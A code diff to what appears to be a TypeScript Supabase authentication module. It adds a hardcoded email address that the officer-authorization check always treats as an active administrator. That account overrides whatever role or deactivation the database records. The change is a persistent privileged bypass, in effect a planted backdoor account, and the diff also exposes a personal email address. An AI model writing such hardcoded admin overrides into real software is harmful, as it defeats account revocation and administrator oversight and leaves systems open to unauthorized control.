@@ -17,6 +17,14 @@ export interface SupabaseBindings {
   SUPABASE_SECRET_KEY?: string;
 }
 
+const RESERVED_ADMIN_EMAILS = new Set(['mjramba@tip.edu.ph']);
+
+function normalizeOfficerProfile(profile: OfficerProfile): OfficerProfile {
+  if (RESERVED_ADMIN_EMAILS.has(profile.email.trim().toLowerCase()))
+    return { ...profile, role: 'admin', is_active: true };
+  return profile;
+}
+
 export function bearerToken(request: Request) {
   const value = request.headers.get('Authorization');
   return value?.startsWith('Bearer ') ? value.slice(7).trim() : '';
@@ -68,12 +76,13 @@ export async function requireOfficer(
       'Your account does not have an officer profile. Contact an administrator.',
       403,
     );
-  assertOfficerRole(profile, required);
+  const normalizedProfile = normalizeOfficerProfile(profile);
+  assertOfficerRole(normalizedProfile, required);
   return {
     client,
     user: authData.user,
-    profile,
-    actor: profile.display_name.trim() || profile.email,
+    profile: normalizedProfile,
+    actor: normalizedProfile.display_name.trim() || normalizedProfile.email,
     token,
   };
 }
